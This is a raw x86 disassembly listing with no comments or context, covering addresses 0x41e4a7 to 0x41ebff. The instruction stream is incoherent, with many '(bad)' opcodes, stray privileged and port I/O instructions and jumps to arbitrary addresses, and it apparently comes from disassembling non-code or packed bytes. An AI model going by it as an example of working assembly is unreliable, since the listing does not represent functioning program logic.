  41e4a7:	lods   al,BYTE PTR ds:[esi]
  41e4a8:	sbb    dl,bh
  41e4aa:	scas   eax,DWORD PTR es:[edi]
  41e4ab:	stos   DWORD PTR es:[edi],eax
  41e4ac:	into   
  41e4ad:	xor    DWORD PTR [eax+0x40],eax
  41e4b0:	cmp    DWORD PTR [edx+0x38],ebx
  41e4b3:	cwde   
  41e4b4:	adc    bl,al
  41e4b6:	stos   DWORD PTR es:[edi],eax
  41e4b7:	sub    al,0x6e
  41e4b9:	push   eax
  41e4ba:	repz fld QWORD PTR [eax-0x14]
  41e4be:	enter  0xb2bd,0x82
  41e4c2:	data16 or al,0x3
  41e4c5:	add    bl,BYTE PTR [eax]
  41e4c7:	xchg   DWORD PTR [eax],edi
  41e4c9:	jae    0x41e454
  41e4cb:	aam    0xfc
  41e4cd:	push   es
  41e4ce:	mov    cl,al
  41e4d0:	adc    ebx,esp
  41e4d2:	enter  0x6907,0x24
  41e4d6:	(bad)  [eax-0x7876270c]
  41e4dc:	or     BYTE PTR [edx+edi*8+0x26],0xe0
  41e4e1:	test   esp,esi
  41e4e3:	adc    al,0x69
  41e4e5:	dec    ebp
  41e4e6:	add    edx,0x3648ea37
  41e4ec:	push   edx
  41e4ed:	mov    cl,0x80
  41e4ef:	test   BYTE PTR [edx],bl
  41e4f1:	sub    esi,DWORD PTR [eax+0x9]
  41e4f4:	mov    al,ds:0xe6ff89f
  41e4f9:	popa   
  41e4fa:	or     ecx,DWORD PTR [ebp+0x79]
  41e4fd:	test   BYTE PTR [ebp+0x42],dl
  41e500:	test   eax,0x7abf736b
  41e505:	fs push ecx
  41e507:	adc    DWORD PTR [edi+esi*4-0x1f],ebp
  41e50b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e50c:	clc    
  41e50d:	pusha  
  41e50e:	test   al,ch
  41e510:	popa   
  41e511:	fimul  DWORD PTR ds:0xc8a4f261
  41e517:	push   esi
  41e518:	adc    DWORD PTR [ecx+eiz*4+0x3f8db8cd],edx
  41e51f:	xor    cl,bl
  41e521:	lods   al,BYTE PTR ds:[esi]
  41e522:	dec    esp
  41e523:	aas    
  41e524:	xor    cl,bh
  41e526:	xchg   ebx,eax
  41e527:	fwait
  41e528:	loop   0x41e4ca
  41e52a:	and    DWORD PTR [edi+edi*8-0x41],ecx
  41e52e:	mov    al,0x5b
  41e530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e531:	ss inc ebp
  41e533:	and    al,0x6a
  41e535:	adc    dh,BYTE PTR [edx]
  41e537:	ins    BYTE PTR es:[edi],dx
  41e538:	and    al,0x3c
  41e53a:	pop    ss
  41e53b:	(bad)  [esi-0x5319166c]
  41e541:	add    al,0x40
  41e543:	aas    
  41e544:	xor    edx,DWORD PTR [ecx+ebp*8+0x655a7592]
  41e54b:	cmp    al,0x87
  41e54d:	addr16 out 0xd,al
  41e550:	ret    0x6316
  41e553:	jl     0x41e5cc
  41e555:	pop    edx
  41e556:	sbb    eax,0xcfaaeaa4
  41e55b:	scas   al,BYTE PTR es:[edi]
  41e55c:	retf   0xacd7
  41e55f:	xor    esi,edi
  41e561:	repz fdivr QWORD PTR [esi+0x25b5febb]
  41e568:	mov    DWORD PTR [ecx-0x1bd5eb52],edx
  41e56e:	out    0x2b,al
  41e570:	shl    edx,cl
  41e572:	inc    ebp
  41e573:	sub    DWORD PTR [esi+edi*1+0x1f],edi
  41e577:	iret   
  41e578:	scas   eax,DWORD PTR es:[edi]
  41e579:	gs jle 0x41e5ca
  41e57c:	push   ebx
  41e57d:	jge    0x41e55d
  41e57f:	or     bl,BYTE PTR [ebp-0x168c38a8]
  41e585:	jle    0x41e606
  41e587:	call   DWORD PTR [esi-0x72acc4d5]
  41e58d:	xchg   esi,eax
  41e58e:	fstp   QWORD PTR [eax+0x3f]
  41e591:	pop    es
  41e592:	fst    DWORD PTR [ecx-0x46]
  41e595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e596:	iret   
  41e597:	loopne 0x41e587
  41e599:	shl    DWORD PTR [ebp-0x1f15f432],1
  41e59f:	sub    al,0xd1
  41e5a1:	xor    dl,BYTE PTR [ecx+eax*1+0x282eee9c]
  41e5a8:	les    edx,FWORD PTR [ecx]
  41e5aa:	sti    
  41e5ab:	sub    al,0x25
  41e5ad:	mov    dh,0x3b
  41e5af:	push   ebp
  41e5b0:	(bad)
  41e5b5:	xor    dh,ch
  41e5b7:	xor    eax,0x5e34b555
  41e5bc:	mov    bh,0x83
  41e5be:	or     DWORD PTR [esi],ebp
  41e5c0:	jmp    0xb806:0xe69875fc
  41e5c7:	xchg   edx,eax
  41e5c8:	and    ah,BYTE PTR [edx]
  41e5ca:	scas   eax,DWORD PTR es:[edi]
  41e5cb:	sub    BYTE PTR [eax-0x3b],ch
  41e5ce:	fs dec edi
  41e5d0:	pop    edx
  41e5d1:	jmp    0x41e557
  41e5d3:	push   ds
  41e5d4:	dec    esi
  41e5d5:	scas   eax,DWORD PTR es:[edi]
  41e5d6:	mov    cl,0x7a
  41e5d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5d9:	xchg   esp,ebp
  41e5db:	cmp    al,0xf6
  41e5dd:	adc    DWORD PTR [eax-0x69],esi
  41e5e0:	xor    eax,0x11552e91
  41e5e5:	lods   eax,DWORD PTR ds:[esi]
  41e5e6:	pop    es
  41e5e7:	cs js  0x41e655
  41e5ea:	jno    0x41e5a3
  41e5ec:	sbb    DWORD PTR [esi+0x28],esi
  41e5ef:	js     0x41e61e
  41e5f1:	sub    DWORD PTR [eax],0x39
  41e5f4:	ss dec eax
  41e5f6:	mov    dh,0x18
  41e5f8:	les    esp,FWORD PTR [ebp+0x399b796d]
  41e5fe:	data16 fimul WORD PTR [edi-0xa]
  41e602:	jbe    0x41e591
  41e604:	pop    ecx
  41e605:	sub    eax,0x7fe6f0c1
  41e60a:	mov    dh,0xa7
  41e60c:	das    
  41e60d:	mov    BYTE PTR [ebp+0x525e56fc],ch
  41e613:	mov    eax,ds:0x9525e9e1
  41e618:	adc    eax,0xbb3af086
  41e61d:	fist   DWORD PTR [ecx+esi*8+0x77]
  41e621:	mov    edi,eax
  41e623:	fnstcw WORD PTR [ecx-0x185ae81]
  41e629:	pop    edx
  41e62a:	mov    eax,0xfb98deb3
  41e62f:	mov    esp,0x1fabbdf2
  41e634:	add    eax,0x8e97c60b
  41e639:	xchg   edx,eax
  41e63a:	gs in  eax,dx
  41e63c:	int3   
  41e63d:	mov    ds:0x65d7d3ad,eax
  41e642:	test   al,0x94
  41e644:	and    BYTE PTR [ecx+0x67],0x48
  41e648:	pop    edx
  41e649:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e64b:	fwait
  41e64c:	inc    al
  41e64e:	pop    esi
  41e64f:	fwait
  41e650:	mov    eax,0x7cffedf0
  41e655:	sbb    dl,BYTE PTR ds:[ebx+0x27]
  41e659:	stos   BYTE PTR es:[edi],al
  41e65a:	dec    ebp
  41e65b:	shl    DWORD PTR [edx],cl
  41e65d:	fcmovnb st,st(3)
  41e65f:	ror    DWORD PTR ds:0x3ef8bb06,0x93
  41e666:	int    0xf4
  41e668:	xchg   ecx,edi
  41e66a:	dec    ebx
  41e66b:	test   al,0x83
  41e66d:	aad    0xc4
  41e66f:	arpl   WORD PTR [edi-0x56],sp
  41e672:	rol    BYTE PTR [ecx-0x8],0x9d
  41e676:	sar    DWORD PTR [ebp+0x2ec4aa36],cl
  41e67c:	jbe    0x41e63e
  41e67e:	fisttp DWORD PTR [ebx-0x3a63bb27]
  41e684:	inc    edx
  41e685:	idiv   ecx
  41e687:	fild   DWORD PTR [eax]
  41e689:	sahf   
  41e68a:	fwait
  41e68b:	pop    edx
  41e68c:	dec    ebp
  41e68d:	xor    bl,dl
  41e68f:	jmp    0x41e667
  41e691:	dec    edx
  41e692:	(bad)  
  41e693:	sub    ebx,ecx
  41e695:	leave  
  41e696:	sub    dh,BYTE PTR [edx-0x53]
  41e699:	clc    
  41e69a:	addr16 icebp 
  41e69c:	push   ds
  41e69d:	loop   0x41e70f
  41e69f:	jmp    0xb73c:0x9b3c98a3
  41e6a6:	xor    cl,BYTE PTR [edx]
  41e6a8:	(bad)  
  41e6a9:	sbb    edx,DWORD PTR [esi+0x36ee47b0]
  41e6af:	mov    ch,0xb3
  41e6b1:	or     ebx,DWORD PTR [eax+esi*2]
  41e6b4:	pop    ebp
  41e6b5:	dec    edx
  41e6b6:	jp     0x41e6cb
  41e6b8:	or     ebx,DWORD PTR [ecx+0x31a543e8]
  41e6be:	jmp    0x41e68c
  41e6c0:	add    ah,bh
  41e6c2:	int    0x99
  41e6c4:	mov    esp,0xb3fff697
  41e6c9:	pop    edi
  41e6ca:	inc    esp
  41e6cb:	lds    ebx,FWORD PTR [ebp+0x781fcd1]
  41e6d1:	mov    bh,0xfd
  41e6d3:	jmp    0x41e723
  41e6d5:	xor    al,0xf4
  41e6d7:	and    al,0x7a
  41e6d9:	dec    esi
  41e6da:	lea    esi,[eax]
  41e6dc:	jne    0x41e6bd
  41e6de:	inc    ecx
  41e6df:	das    
  41e6e0:	push   ebx
  41e6e1:	dec    esp
  41e6e2:	sti    
  41e6e3:	push   es
  41e6e4:	int    0x8
  41e6e6:	iret   
  41e6e7:	xchg   ebx,eax
  41e6e8:	out    0xe,al
  41e6ea:	pop    edx
  41e6eb:	test   DWORD PTR cs:0x33cf8009,edx
  41e6f2:	test   BYTE PTR [edx-0xc],bh
  41e6f5:	cwde   
  41e6f6:	outs   dx,BYTE PTR ds:[esi]
  41e6f7:	sub    BYTE PTR [edi+0x7c1b439a],dh
  41e6fd:	fiadd  DWORD PTR [edi-0x29]
  41e700:	mov    edx,0xa5b17c1
  41e705:	adc    BYTE PTR [eax-0x25c0b29],0x45
  41e70c:	and    DWORD PTR [ebp+ebx*4+0x7602eb2],edx
  41e713:	jmp    0x41e717
  41e715:	pop    es
  41e716:	loopne 0x41e745
  41e718:	scas   al,BYTE PTR es:[edi]
  41e719:	ja     0x41e76d
  41e71b:	add    eax,0xa15b7585
  41e720:	in     eax,dx
  41e721:	or     dh,0x15
  41e724:	fcomp  QWORD PTR [esi-0x283f51d3]
  41e72a:	mov    ds:0x2b0487ed,eax
  41e72f:	dec    edi
  41e730:	push   ds
  41e731:	(bad)
  41e735:	or     al,0x77
  41e737:	aaa    
  41e738:	mov    esi,0x4908a5fe
  41e73d:	cmp    al,0x6e
  41e73f:	aas    
  41e740:	data16 lahf 
  41e742:	popf   
  41e743:	nop
  41e744:	sbb    eax,0xbf980aff
  41e749:	adc    BYTE PTR [edx+0x6a],bh
  41e74c:	push   edx
  41e74d:	and    ecx,edi
  41e74f:	xor    cl,BYTE PTR [ecx-0x73484421]
  41e755:	xchg   esi,eax
  41e756:	in     al,0xa9
  41e758:	cmp    esp,edi
  41e75a:	pop    edi
  41e75b:	push   edi
  41e75c:	cdq    
  41e75d:	stos   DWORD PTR es:[edi],eax
  41e75e:	inc    ebx
  41e75f:	das    
  41e760:	inc    ecx
  41e761:	out    dx,al
  41e762:	sbb    dh,dh
  41e764:	in     eax,dx
  41e765:	inc    edi
  41e766:	fs (bad) 
  41e768:	pushf  
  41e769:	pop    ss
  41e76a:	xchg   BYTE PTR [ecx+edx*2],dl
  41e76d:	inc    ebx
  41e76e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e76f:	stos   DWORD PTR es:[edi],eax
  41e770:	std    
  41e771:	loope  0x41e773
  41e773:	push   esi
  41e774:	mov    WORD PTR [edx],?
  41e776:	or     al,0x3
  41e778:	adc    bl,dh
  41e77a:	fidivr WORD PTR [edi+0x46b0db7a]
  41e780:	stos   WORD PTR es:[edi],ax
  41e782:	adc    DWORD PTR [esp+eax*4+0x3e],ecx
  41e786:	jl     0x41e76f
  41e788:	xchg   BYTE PTR [edi+esi*4-0x2],dh
  41e78c:	mov    ds:0x29165682,eax
  41e791:	sahf   
  41e792:	pusha  
  41e793:	inc    esp
  41e794:	test   al,0xcd
  41e796:	xchg   esi,eax
  41e797:	cdq    
  41e798:	retf   
  41e799:	cmp    eax,0xf0f15f9
  41e79e:	(bad)  
  41e79f:	fldenv [esi+ebx*8+0x6f]
  41e7a3:	and    eax,0xf5c94e91
  41e7a8:	adc    BYTE PTR [ebx*8+0x44424ae3],ch
  41e7af:	lahf   
  41e7b0:	xor    al,0xe5
  41e7b2:	and    BYTE PTR [esi+ebp*4+0x45ae2f7a],ah
  41e7b9:	cmp    DWORD PTR [ebp+ecx*1-0x1d],edx
  41e7bd:	pop    esi
  41e7be:	jnp    0x41e795
  41e7c0:	jg     0x41e827
  41e7c2:	sub    al,0x46
  41e7c4:	add    eax,0xecbdcc89
  41e7c9:	pop    esp
  41e7ca:	enter  0xb86a,0xe6
  41e7ce:	leave  
  41e7cf:	push   ds
  41e7d0:	sub    eax,0xab14da1
  41e7d5:	sti    
  41e7d6:	push   0x1f5fc4c0
  41e7db:	push   ss
  41e7dc:	sbb    al,0x14
  41e7de:	jmp    0x90f1:0x86d29ed7
  41e7e5:	pop    eax
  41e7e6:	mov    cl,0x66
  41e7e8:	gs into 
  41e7ea:	add    eax,0xe3a6d6f1
  41e7ef:	int    0x33
  41e7f1:	adc    edi,ecx
  41e7f3:	pop    ecx
  41e7f4:	leave  
  41e7f5:	rol    BYTE PTR [ebp-0x34],1
  41e7f8:	add    DWORD PTR [ebp+0x6fca464c],ebx
  41e7fe:	mov    eax,0x2684f820
  41e803:	mov    al,ds:0xe606c757
  41e808:	push   ebx
  41e809:	push   edi
  41e80a:	call   0x41594e
  41e80f:	mov    esi,DWORD PTR [ebp-0x228]
  41e815:	cmp    esi,eax
  41e817:	jmp    0x41ebfe
  41e81c:	mov    dh,0x8
  41e81e:	xor    al,0xa5
  41e820:	mov    ah,0xb9
  41e822:	mov    esp,0xddc4c918
  41e827:	nop
  41e828:	sub    ebx,eax
  41e82a:	dec    edx
  41e82b:	xchg   edx,eax
  41e82c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e82d:	outs   dx,DWORD PTR ds:[esi]
  41e82e:	sar    BYTE PTR [esi-0x41413bb6],0xa7
  41e835:	jecxz  0x41e82c
  41e837:	fimul  DWORD PTR [ecx]
  41e839:	and    DWORD PTR [edx+0x24],esp
  41e83c:	loopne 0x41e8a5
  41e83e:	and    esp,DWORD PTR [eax+0x5cf037ab]
  41e844:	retf   
  41e845:	pop    es
  41e846:	lds    ebp,FWORD PTR [edi-0x16948876]
  41e84c:	dec    ecx
  41e84d:	pusha  
  41e84e:	push   esp
  41e84f:	je     0x41e847
  41e851:	cwde   
  41e852:	or     ecx,DWORD PTR [ebx-0x12fa3030]
  41e858:	mov    ecx,0x6e161cf5
  41e85d:	push   0xffffff88
  41e85f:	mov    BYTE PTR ss:[esi],bl
  41e862:	adc    dl,BYTE PTR [ecx-0x8dd794f]
  41e868:	dec    edx
  41e869:	dec    ebx
  41e86a:	clc    
  41e86b:	adc    eax,0x11af0bd3
  41e870:	xor    al,0x42
  41e872:	test   BYTE PTR [esi-0x1a],bh
  41e875:	aaa    
  41e876:	mov    BYTE PTR [esi],dl
  41e878:	test   DWORD PTR [edx-0x2c],eax
  41e87b:	push   ebp
  41e87c:	push   ds
  41e87d:	mov    bh,0x1e
  41e87f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e880:	lock test ebp,esi
  41e883:	and    cl,al
  41e885:	loop   0x41e810
  41e887:	cs dec esp
  41e889:	das    
  41e88a:	out    0x36,al
  41e88c:	pusha  
  41e88d:	cmp    al,0xa6
  41e88f:	xor    bl,cl
  41e891:	dec    esp
  41e892:	pop    ebp
  41e893:	in     eax,dx
  41e894:	dec    eax
  41e895:	mov    ebp,0xb5edd287
  41e89a:	outs   dx,BYTE PTR ds:[esi]
  41e89b:	xor    DWORD PTR [eax+0x2a757253],edi
  41e8a1:	cdq    
  41e8a2:	lock sub DWORD PTR [eax+0x898b9a9],0x71
  41e8aa:	in     eax,0x39
  41e8ac:	pop    esp
  41e8ad:	rol    DWORD PTR [esi+0x4f],1
  41e8b0:	ds pop esp
  41e8b2:	stos   BYTE PTR es:[edi],al
  41e8b3:	and    eax,edi
  41e8b5:	sbb    ch,dl
  41e8b7:	sbb    ecx,DWORD PTR [ebx]
  41e8b9:	push   esi
  41e8ba:	call   0xed05b76e
  41e8bf:	sub    BYTE PTR [ebp+0x349a5bfe],cl
  41e8c5:	cdq    
  41e8c6:	retf   
  41e8c7:	pop    ebx
  41e8c8:	aad    0x41
  41e8ca:	mov    ds:0xf156e365,al
  41e8cf:	ins    BYTE PTR es:[edi],dx
  41e8d0:	mov    cl,0x61
  41e8d2:	aam    0xc
  41e8d4:	sub    edx,esp
  41e8d6:	cwde   
  41e8d7:	and    DWORD PTR [ecx],eax
  41e8d9:	dec    ecx
  41e8da:	or     al,0xa9
  41e8dc:	ficom  DWORD PTR [ebp+0x4b]
  41e8df:	loop   0x41e8c2
  41e8e1:	loop   0x41e946
  41e8e3:	push   ebp
  41e8e4:	loop   0x41e891
  41e8e6:	jns    0x41e94b
  41e8e8:	add    BYTE PTR [esi+0x21],cl
  41e8eb:	inc    edx
  41e8ec:	cmp    ebp,edx
  41e8ee:	imul   ecx,DWORD PTR [ebx],0x29
  41e8f1:	nop
  41e8f2:	dec    edi
  41e8f3:	lock sbb BYTE PTR [edx-0x15],al
  41e8f7:	xor    DWORD PTR [ecx-0xa451dbd],ebx
  41e8fd:	pop    edx
  41e8fe:	in     al,0xd5
  41e900:	adc    DWORD PTR [eax-0x3f],ecx
  41e903:	mov    dl,BYTE PTR [ebp+0x61819d19]
  41e909:	mov    bl,0x44
  41e90b:	jg     0x41e931
  41e90d:	mov    ds:0xcac41914,al
  41e912:	jne    0x41e8f0
  41e914:	sbb    DWORD PTR [ecx+0x1175176a],ebp
  41e91a:	daa    
  41e91b:	mov    eax,ds:0xd331e470
  41e920:	inc    edx
  41e921:	sbb    al,0xc4
  41e923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e924:	mov    ebx,DWORD PTR [edi+0x562de9ea]
  41e92a:	pop    es
  41e92b:	sbb    al,0x9b
  41e92d:	push   ds
  41e92e:	jmp    0xc2cd66e4
  41e933:	popf   
  41e934:	cmp    cl,cl
  41e936:	add    esp,esp
  41e938:	std    
  41e939:	mov    dl,0xdf
  41e93b:	mov    ds,eax
  41e93d:	sbb    ecx,DWORD PTR [edi]
  41e93f:	push   cs
  41e940:	fadd   DWORD PTR [edx-0x12571560]
  41e946:	and    BYTE PTR [ebx+ebx*4-0x3d691a8d],dl
  41e94d:	mov    ah,BYTE PTR [edi]
  41e94f:	add    eax,0x4e3ebfb3
  41e954:	dec    esp
  41e955:	add    DWORD PTR [ecx+ecx*4],ebx
  41e958:	(bad)  
  41e959:	ins    DWORD PTR es:[edi],dx
  41e95a:	imul   edx,DWORD PTR [ecx-0x28],0xbb42a334
  41e961:	sub    DWORD PTR [edi],eax
  41e963:	push   edi
  41e964:	jle    0x41e94b
  41e966:	xchg   ecx,eax
  41e967:	inc    ecx
  41e968:	jmp    0xdeb02f50
  41e96d:	mul    eax
  41e96f:	cmp    eax,0x97afcb49
  41e974:	es and DWORD PTR fs:[esi+0x293f016d],ebx
  41e97c:	mov    dh,0xe1
  41e97e:	xor    BYTE PTR [eax-0x2f8bdc62],bh
  41e984:	pop    ebx
  41e985:	jns    0x41e9fd
  41e987:	mov    edx,DWORD PTR [ecx-0x1d]
  41e98a:	push   esi
  41e98b:	(bad)  [esi+0x2f450507]
  41e991:	inc    edi
  41e992:	xchg   DWORD PTR [edx-0x27dd842e],ebx
  41e998:	dec    ebp
  41e999:	push   esi
  41e99a:	lds    edx,FWORD PTR [ebx]
  41e99c:	addr16 gs push ebp
  41e99f:	push   esi
  41e9a0:	sub    BYTE PTR [ebp+0x53fd011d],dh
  41e9a6:	mov    bl,0x8d
  41e9a8:	arpl   WORD PTR [ecx],dx
  41e9aa:	jge    0x41e939
  41e9ac:	jg     0x41e981
  41e9ae:	pop    ebp
  41e9af:	fsub   DWORD PTR [esi+0x10105020]
  41e9b5:	out    dx,al
  41e9b6:	call   0x38fb99b1
  41e9bb:	jg     0x41e9b6
  41e9bd:	jns    0x41e993
  41e9bf:	loopne 0x41e975
  41e9c1:	cmp    DWORD PTR [ebx*2+0x5801317d],0x832183f5
  41e9cc:	jno    0x41e9d5
  41e9ce:	jmp    0x41ea39
  41e9d0:	adc    dh,BYTE PTR [ecx+0x19]
  41e9d3:	and    BYTE PTR [ecx+0x7c7ca000],cl
  41e9d9:	jle    0x41ea29
  41e9db:	icebp  
  41e9dc:	mov    dl,0x9e
  41e9de:	test   ch,dl
  41e9e0:	je     0x41e992
  41e9e2:	shl    BYTE PTR [ecx],cl
  41e9e4:	int3   
  41e9e5:	push   ds
  41e9e6:	outs   dx,BYTE PTR ds:[esi]
  41e9e7:	sbb    al,0x27
  41e9e9:	xor    eax,0x7236285d
  41e9ee:	out    dx,al
  41e9ef:	shl    BYTE PTR [ecx-0x200f3e8a],cl
  41e9f5:	mov    esp,0xd7f53811
  41e9fa:	mov    eax,ds:0xb6696c1
  41e9ff:	hlt    
  41ea00:	jl     0x41e9aa
  41ea02:	cli    
  41ea03:	and    al,0xe0
  41ea05:	sbb    ch,bh
  41ea07:	(bad)  
  41ea08:	xlat   BYTE PTR ds:[ebx]
  41ea09:	(bad)  
  41ea0a:	daa    
  41ea0b:	or     eax,0xffa5f717
  41ea10:	neg    DWORD PTR [edx]
  41ea12:	inc    esi
  41ea13:	add    al,0x9c
  41ea15:	inc    eax
  41ea16:	mov    edx,0x74e4f3d4
  41ea1b:	pop    ecx
  41ea1c:	sub    eax,0x6cd0a814
  41ea21:	xlat   BYTE PTR ds:[ebx]
  41ea22:	std    
  41ea23:	ins    DWORD PTR es:[edi],dx
  41ea24:	mov    eax,ds:0xeea95526
  41ea29:	jg     0x41eaa6
  41ea2b:	mov    al,ds:0x4af5bbde
  41ea30:	pop    ds
  41ea31:	iret   
  41ea32:	out    0x46,eax
  41ea34:	and    DWORD PTR [eax+ecx*2+0x3c],edx
  41ea38:	in     eax,dx
  41ea39:	outs   dx,DWORD PTR ds:[esi]
  41ea3a:	les    edx,FWORD PTR [esi-0x5f800b65]
  41ea40:	lahf   
  41ea41:	scas   al,BYTE PTR es:[edi]
  41ea42:	test   al,0xd
  41ea44:	add    esi,eax
  41ea46:	les    esi,FWORD PTR [ecx+0x592a9120]
  41ea4c:	test   DWORD PTR [eax+0x2e33acfd],edi
  41ea52:	push   esi
  41ea53:	cdq    
  41ea54:	sbb    dh,bh
  41ea56:	and    DWORD PTR [edi],0x57
  41ea59:	call   0xba9eac1c
  41ea5e:	(bad)  
  41ea60:	mov    al,bl
  41ea62:	mov    WORD PTR [edi+0x7b],es
  41ea65:	icebp  
  41ea66:	mov    ebx,0xfc023b1
  41ea6b:	and    al,0x2e
  41ea6d:	dec    edx
  41ea6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea6f:	shl    BYTE PTR [esp+ebx*8],1
  41ea72:	jnp    0x41eacb
  41ea74:	pop    es
  41ea75:	xchg   edi,eax
  41ea76:	test   eax,0xb3720405
  41ea7b:	and    al,0x3d
  41ea7d:	xchg   edx,eax
  41ea7e:	dec    esi
  41ea7f:	mov    ebp,0x12d68560
  41ea84:	cmp    BYTE PTR [edi-0x330b637d],dl
  41ea8a:	xchg   DWORD PTR [ebp-0x53fb9ff6],esp
  41ea90:	int3   
  41ea91:	cdq    
  41ea92:	int3   
  41ea93:	es jle 0x41eaac
  41ea96:	xchg   ebx,eax
  41ea97:	push   cs
  41ea98:	retf   
  41ea99:	dec    esi
  41ea9a:	xor    dh,0xd
  41ea9d:	or     bl,bl
  41ea9f:	daa    
  41eaa0:	sbb    al,0x9a
  41eaa2:	(bad)  
  41eaa3:	mov    DWORD PTR [esi+edi*2-0x3c],ebp
  41eaa7:	inc    edi
  41eaa8:	adc    BYTE PTR [ebp-0x47],ch
  41eaab:	test   eax,0x914e182a
  41eab0:	jo     0x41eab4
  41eab2:	das    
  41eab3:	mov    dl,0xa7
  41eab5:	mov    eax,ds:0x96f2e256
  41eaba:	pop    edx
  41eabb:	add    dl,BYTE PTR [ebx+0x18f2d82f]
  41eac1:	retf   0xa6bb
  41eac4:	out    dx,al
  41eac5:	xor    al,0x2b
  41eac7:	aad    0x66
  41eac9:	aad    0x2b
  41eacb:	sub    BYTE PTR [edi-0x7e93524b],ah
  41ead1:	jns    0x41eafb
  41ead3:	sbb    al,0xfe
  41ead5:	lahf   
  41ead6:	push   ebp
  41ead7:	sub    edx,edi
  41ead9:	or     edx,DWORD PTR ds:0xeafefa7f
  41eadf:	clc    
  41eae0:	(bad)  
  41eae2:	mov    cl,0x88
  41eae4:	outs   dx,BYTE PTR ds:[esi]
  41eae5:	(bad)  
  41eae6:	js     0x41ea98
  41eae8:	(bad)  
  41eae9:	jns    0x41ea8a
  41eaeb:	and    BYTE PTR [ebx-0x67f22ed3],ch
  41eaf1:	iret   
  41eaf2:	stos   DWORD PTR es:[edi],eax
  41eaf3:	std    
  41eaf4:	enter  0x9dbf,0xf8
  41eaf8:	mov    ah,0x66
  41eafa:	pmaddwd mm4,QWORD PTR [ebx+0x189e9a76]
  41eb01:	fidiv  DWORD PTR [edi]
  41eb03:	loop   0x41eb51
  41eb05:	xor    al,0xa4
  41eb07:	add    esp,DWORD PTR ds:0xe212aabe
  41eb0d:	out    0xc8,eax
  41eb0f:	test   DWORD PTR [ebx+ecx*8-0x49],esp
  41eb13:	gs dec ebx
  41eb15:	cmp    esp,DWORD PTR [edi-0x2e]
  41eb18:	and    al,0x3b
  41eb1a:	ins    DWORD PTR es:[edi],dx
  41eb1b:	aas    
  41eb1c:	mov    ebx,0x90a682a1
  41eb21:	push   esi
  41eb22:	mov    cl,0xbd
  41eb24:	xor    DWORD PTR [eax-0x38a426ed],esp
  41eb2a:	aas    
  41eb2b:	adc    cl,bl
  41eb2d:	dec    ecx
  41eb2e:	(bad)  
  41eb2f:	fs pop esi
  41eb31:	lahf   
  41eb32:	push   cs
  41eb33:	and    ah,BYTE PTR [esi-0x22]
  41eb36:	cmp    eax,0x74aeb4f3
  41eb3b:	add    edx,DWORD PTR [ebp+0x78]
  41eb3e:	xchg   edi,eax
  41eb3f:	jmp    0x55cd:0xd27b6dc5
  41eb46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb47:	push   ss
  41eb48:	xchg   ebx,eax
  41eb49:	push   ebx
  41eb4a:	(bad)  
  41eb4b:	jo     0x41eb89
  41eb4d:	mov    WORD PTR [edi+0x6a],es
  41eb50:	repz xchg edi,eax
  41eb52:	inc    edx
  41eb53:	push   cs
  41eb54:	cmp    BYTE PTR [eax],cl
  41eb56:	mov    cl,0x58
  41eb58:	ss push edx
  41eb5a:	cwde   
  41eb5b:	adc    al,0x3
  41eb5d:	adc    dh,bl
  41eb5f:	retf   
  41eb60:	stos   BYTE PTR es:[edi],al
  41eb61:	call   0xc98af0
  41eb66:	jb     0x41eb1f
  41eb68:	dec    edi
  41eb69:	shr    DWORD PTR [edx],0xa4
  41eb6c:	dec    esp
  41eb6d:	inc    ebx
  41eb6e:	mov    BYTE PTR [edi-0x4e500401],ah
  41eb74:	mov    ch,0xd6
  41eb76:	pop    es
  41eb77:	pop    ecx
  41eb78:	cmp    cl,bl
  41eb7a:	aad    0x76
  41eb7c:	inc    ebp
  41eb7d:	add    ch,cl
  41eb7f:	sahf   
  41eb80:	pop    edx
  41eb81:	cmp    al,0x16
  41eb83:	arpl   WORD PTR [edx+0x85c496f],bx
  41eb89:	adc    DWORD PTR ds:0xbb6a042,eax
  41eb8f:	in     al,dx
  41eb90:	stc    
  41eb91:	and    al,0x58
  41eb93:	or     eax,0xb130bb5
  41eb98:	cmp    eax,0x822df0a
  41eb9d:	sub    al,0xf0
  41eb9f:	inc    eax
  41eba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eba1:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41eba3:	or     DWORD PTR [edi-0x3a17ffac],ebx
  41eba9:	test   eax,0x1b4257b5
  41ebae:	lea    edx,[esi+0x4d]
  41ebb1:	and    al,0x36
  41ebb3:	sbb    DWORD PTR [ebx],ebx
  41ebb5:	sbb    DWORD PTR [ecx+0xc],edi
  41ebb8:	mov    bl,0x82
  41ebba:	cmp    esi,esp
  41ebbc:	mov    ecx,0x25813c1d
  41ebc1:	mov    ebx,0xd39d42fb
  41ebc6:	retf   0x63dd
  41ebc9:	jne    0x41eb62
  41ebcb:	add    al,0xeb
  41ebcd:	xor    eax,DWORD PTR [edx]
  41ebcf:	jae    0x41eb89
  41ebd1:	xchg   edi,eax
  41ebd2:	push   esi
  41ebd3:	fdiv   QWORD PTR [ebx]
  41ebd5:	imul   ecx,DWORD PTR [edi-0x6d],0xffffffcb
  41ebd9:	in     ax,0x66
  41ebdc:	mov    bh,0xa9
  41ebde:	dec    esp
  41ebdf:	adc    DWORD PTR [ebx-0x1f],ecx
  41ebe2:	xchg   ebp,eax
  41ebe3:	add    BYTE PTR [ecx+0x67],dh
  41ebe6:	clc    
  41ebe7:	sahf   
  41ebe8:	or     BYTE PTR [esi+0x9f3c40],dl
  41ebee:	cmp    DWORD PTR [edi-0x62abc40f],ebx
  41ebf4:	retf   
  41ebf5:	popf   
  41ebf6:	ret    
  41ebf7:	dec    edi
  41ebf8:	and    dl,BYTE PTR [edi+0x5e]
  41ebfb:	jbe    0x41eb7e
  41ebfd:	js     0x41ec0e
  41ebff:	test   BYTE PTR [esi+0x4],dl
